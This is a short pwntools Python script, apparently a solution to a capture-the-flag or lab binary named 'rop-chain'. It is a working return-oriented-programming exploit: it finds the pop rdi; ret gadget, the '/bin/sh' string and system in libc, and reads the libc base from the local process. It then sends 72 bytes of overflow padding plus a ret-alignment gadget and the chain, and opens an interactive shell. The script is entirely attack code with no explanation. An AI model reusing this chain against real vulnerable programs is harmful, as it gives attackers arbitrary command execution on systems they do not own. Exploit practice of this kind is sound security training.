#!/usr/bin/env python3

from pwn import *

context.arch = "amd64"

elf = ELF("./rop-chain")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

rop_libc = ROP(libc)

# libc offsets
pop_rdi_offset = rop_libc.find_gadget(["pop rdi", "ret"]).address
bin_sh_offset  = next(libc.search(b"/bin/sh"))
system_offset  = libc.symbols["system"]

print("pop rdi; ret =", hex(pop_rdi_offset))
print("/bin/sh       =", hex(bin_sh_offset))
print("system        =", hex(system_offset))

# Start process
p = process("./rop-chain")

# Get libc base of THIS process
for path, addr in p.libs().items():
    if path.endswith("libc.so.6"):
        libc_base = addr
        break

print("libc_base =", hex(libc_base))

# Runtime addresses
pop_rdi = libc_base + pop_rdi_offset
bin_sh  = libc_base + bin_sh_offset
system  = libc_base + system_offset

print("pop rdi =", hex(pop_rdi))
print("/bin/sh =", hex(bin_sh))
print("system  =", hex(system))

# ret gadget for stack alignment
rop_elf = ROP(elf)
ret = rop_elf.find_gadget(["ret"]).address

print("ret     =", hex(ret))

# ROP chain
payload = flat(
    b"A" * 72,
    ret,
    pop_rdi,
    bin_sh,
    system,
)

p.send(payload)
p.interactive()
